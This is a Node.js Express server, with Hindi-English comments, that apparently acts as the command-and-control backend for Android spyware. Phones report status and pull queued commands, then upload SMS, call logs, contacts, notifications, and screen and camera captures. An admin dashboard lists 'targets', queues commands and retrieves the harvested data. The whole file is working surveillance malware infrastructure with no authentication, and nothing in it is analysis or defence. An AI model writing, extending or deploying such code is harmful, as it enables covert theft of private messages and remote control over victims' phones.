const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Storage Setup
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Sabhi devices ka live status store karne ke liye
let devicesStatus = {}; 

// ==================================================
// 📲 PHONE SIDE API
// ==================================================

app.post('/api/status', (req, res) => {
    let { device_id, model, battery, version, charging } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    const id = device_id.toString().trim().toUpperCase();

    // Check if any command is waiting for this phone
    const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

    // Update Memory (For Super Admin)
    devicesStatus[id] = {
        id: id,
        model: model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lastSeen: Date.now(),
        command: "none" // Command delivery ke baad reset
    };

    console.log(`📡 [PING] ${id} | Model: ${model} | Battery: ${battery}% | Cmd: ${pendingCommand}`);
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
        
        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) { existingData = []; }
            }
            if (!Array.isArray(existingData)) existingData = [];

            // Merge New + Old Data
            const finalData = Array.isArray(parsedData) ? [...parsedData, ...existingData] : [parsedData, ...existingData];
            fs.writeFileSync(filePath, JSON.stringify(finalData.slice(0, 1000), null, 2));
        } else {
            // Screen/Camera replace files
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }

        console.log(`📥 [UPLOAD] ${type} received from ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Save Error [${id}]:`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
// 💻 SUPER ADMIN & DASHBOARD API
// ==================================================

// 🌟 FEATURE: Get All Registered Devices
app.get('/api/admin/all-devices', (req, res) => {
    // Ye dashboard ko saare active/recent devices ki list dega
    res.json(devicesStatus);
});

// Specific Device Status (For Personal Dashboard)
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];

    if (!device) {
        return res.json({ id: id, isOnline: false, model: "Searching..." });
    }

    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

// Send Command from Admin
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Cmd" });

    const id = device_id.toUpperCase().trim();
    
    // Agar device memory mein nahi hai, toh temporary create karo
    if (!devicesStatus[id]) {
        devicesStatus[id] = { id: id, model: "Offline Target", lastSeen: 0 };
    }
    
    devicesStatus[id].command = command;
    console.log(`🚀 [CMD QUEUED] ${command} -> ${id}`);
    res.json({ status: "success", target: id });
});

// Get Data Files (Contacts/SMS/Logs)
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const id = req.params.device_id.toUpperCase().trim();
    const type = req.params.type;
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

app.listen(PORT, () => {
    console.log(`🔥 CYBER-SERVER RUNNING ON PORT ${PORT}`);
    console.log(`📂 DATA PATH: ${UPLOADS_DIR}`);
});
